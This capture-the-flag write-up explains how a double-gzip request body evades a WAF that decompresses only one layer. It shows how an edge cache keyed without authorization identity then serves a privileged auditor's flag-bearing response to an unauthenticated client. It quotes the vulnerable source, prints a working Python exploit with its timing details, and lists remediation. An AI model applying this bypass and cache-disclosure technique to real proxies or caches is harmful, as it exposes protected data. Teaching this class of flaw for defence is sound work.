# Frozen Query — double-gzip WAF bypass and cross-authorization cache disclosure

[Русская версия](solve.ru.md)

**Challenge:** GlacierCTF 2026 · web / http / cache / rfc10008 · EmberZero · 50 points.  
**Result:** Solved. The original participant-supplied write-up records a live `HTTP 200`, `X-Cache: HIT` and a cached summit bulletin containing the flag. The participant confirms the flag was accepted on the platform.

**Provenance:** This write-up was checked against the participant's research archive (`frozen-query.tar.gz` containing the original `scripts/exploit_frozen_query.py`, English/Russian write-ups and extracted source) **and the separate organizer handout** (`frozen-query (1).tar.gz`). The edge and backend Python files match byte-for-byte across both archives. It is therefore no longer merely a reconstruction from a third-party walkthrough.

## 1. Interface and authentication

The edge proxy, `src/app.py`, listens on port 1337; backend `src/backend.py` listens on loopback port 8000. A normal `GET /api/bulletin` returns `405` and `Allow: QUERY`. Public `QUERY` requests for ordinary regions like `valley` work.

The `summit` bulletin includes the flag. The backend checks `Authorization: Bearer <AUDIT_TOKEN>` for requests whose region is `summit` or requested fields include `flag`, returning 403 otherwise. Only the edge can access the backend directly.

The edge starts a daemon `auditor_loop()` that sends a privileged `QUERY /api/bulletin` approximately every **five seconds**, with body:

```json
{"region":"summit","fields":["level","note","flag"],"window":0}
```

Here `0` is illustrative: in every real request the `window` value is `int(time.time() // 30)`, the current 30-second bucket. The headers include `Authorization`, `Content-Type: application/vnd.glacier.bulletin+json`, `Accept: application/json` and `Cache-Control: no-cache`.

## 2. Why the auditor's response enters the public cache

The backend sets `Cache-Control: public, max-age=30` even on an authorized summit response. The edge calculates whether to cache the response using:

```python
shareable = not request.headers.get("Authorization") or "public" in cc
if upstream.status_code == 200 and ttl and "no-store" not in cc and shareable:
    cache_put(key, ttl, upstream.status_code, headers, upstream.content)
```

Thus `public` makes the authorized response shareable. The auditor's `Cache-Control: no-cache` causes a **cache read bypass** but does **not** prevent this cache write. Every five seconds the process refreshes the cached summit response, with a TTL of 30 seconds.

Crucially the cache key **does not include the Authorization header, token identity, or a principal/scope**.

## 3. Matching the key

The exact key material comes from `cache_key()`:

```python
canonical = json.dumps(json.loads(content), sort_keys=True, separators=(",", ":"))
material = "\n".join([path, media_type, accept, canonical])
key = hashlib.sha256(material.encode()).hexdigest()
```

The media-type normalizer maps `application/*+json` to `application/json`. To collide with the auditor, match four inputs:

| Cache-key component | Required value |
| --- | --- |
| Path | `/api/bulletin` |
| Normalized Content-Type | `application/json` |
| Accept | `application/json` |
| Canonical body | `{"fields":["level","note","flag"],"region":"summit","window":CURRENT_BUCKET}` |

Directly sending `summit` and `flag` fails, however, because the non-auditor path runs the WAF **before** cache lookup.

## 4. Why two gzip layers bypass the WAF

The original source shows two different operations on `Content-Encoding`:

```python
def waf_allows(body, encoding):
    codings = parse_codings(encoding)
    if codings and codings[-1] == "gzip":
        body = gunzip(body)
    try:
        text = json.dumps(json.loads(body))
    except ValueError:
        text = body.decode("latin-1")
    return not any(word in text.lower() for word in ("flag", "summit"))

def decode_content(body, encoding):
    for _ in reversed(parse_codings(encoding)):
        body = gunzip(body)
    return body
```

`parse_codings` accepts up to **three** codings and only the value `gzip`. With `Content-Encoding: gzip, gzip` and a body of `gzip(gzip(JSON))`:

1. The WAF gunzips **one** layer, leaving compressed bytes. They are not JSON, and their Latin-1 representation contains no recognizable forbidden words.
2. The main handler gunzips **both** layers, recovering the real JSON.
3. The handler computes exactly the same canonical key as the auditor, then consults the cache.
4. If the auditor has already populated the current window, the response is returned as **`X-Cache: HIT`**. No valid auditor token is supplied by the attacker.

This is a mismatch between the representation validated by a WAF and the representation actually consumed by the application.

## 5. Exploit details

The archived successful solver `scripts/exploit_frozen_query.py` uses `requests` and builds:

```python
window = int(time.time() // 30)
body = json.dumps({
    "region": "summit",
    "fields": ["level", "note", "flag"],
    "window": window,
})
raw = gzip.compress(gzip.compress(body.encode()))
headers = {
    "Content-Type": "application/vnd.glacier.bulletin+json",
    "Accept": "application/json",
    "Content-Encoding": "gzip, gzip",
    "Cache-Control": "max-age=0",
}
r = requests.request(
    "QUERY", "https://frozen-query.web.glacierctf.com/api/bulletin",
    data=raw, headers=headers, timeout=15,
)
```

**Cache-Control matters:** the attacker must **not** send `no-cache`, which would bypass cache lookup and forward an unauthorized request to the backend, returning 403.

The original record observed `HTTP 200`, `X-Cache: HIT`, and a summit bulletin with `level`, `note`, `flag`. A different `window` yielded `MISS`, confirming the importance of matching the canonical body.

For a robust replay, [scripts/solve.py](scripts/solve.py) supports a supplied base URL and bounded retries across the five-second auditor refresh interval and 30-second buckets. The single-request original is retained separately.

## 6. Negative controls

- **Plain JSON:** the edge WAF detects `summit`/`flag` and returns `403 blocked by glacier-edge`.
- **One gzip:** the WAF fully reveals the plaintext and returns the same 403.
- **`Cache-Control: no-cache` on the attacking request:** cache lookup is skipped; the backend rejects the unauthenticated summit query.
- **Wrong window:** cache key mismatch; the archived probe observed `X-Cache: MISS`.

## 7. Root cause and remediation

Two security boundaries fail simultaneously. First, the edge authorizes/cache-partitions insufficiently: a private response marked public is cached under a key independent of auditor identity. Second, WAF decoding is shallower than application decoding. Apply full `Content-Encoding` decoding once before inspection, reject ambiguous encodings, and never share privileged responses through a cache keyed only by public request properties.

## 8. Evidence limits

The uploaded research archive has write-ups and the original attack script, not a separately stored packet-level HTTP capture. Its narrative records a successful live response with a redacted flag beginning `gctf{QU3RY_` and ending `r3qu35t}`. The literal full flag is not present in those uploaded files, so it is not reconstructed or fabricated in public text. **The participant's accepted-solve list establishes platform acceptance.**
